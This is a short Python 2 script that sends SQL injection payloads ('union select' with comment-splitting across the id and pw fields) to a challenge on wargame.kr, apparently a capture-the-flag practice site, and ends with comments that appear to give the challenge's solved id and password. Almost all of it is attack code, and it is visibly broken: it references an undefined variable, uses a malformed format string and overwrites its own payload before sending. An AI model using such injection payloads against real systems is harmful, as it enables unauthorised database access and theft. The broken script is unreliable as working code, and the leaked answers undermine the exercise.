# -*- coding: utf8 -*-

import urllib, urllib2, time

headers = {'Host': 'wargame.kr:8080'}

data = "?id="
data = data + urllib.quote("' union select 1,2,3,4,5 from findflag_2 /*")
data = data + "&pw="
data = data + urllib.quote("*/ union select true,true,'{''}''{''},4,5 order by 3 desc#".format('w',string[i]))
data = "&flag="
data = data + urllib.quote("")

req = urllib2.Request("http://wargame.kr:8080/zairo/" + data, '', headers)
response = urllib2.urlopen(req)

res = response.read()
print len(res), res

# pw : wkdlfhpw!!@%%#@@#
# id : zairowkdlfhdkel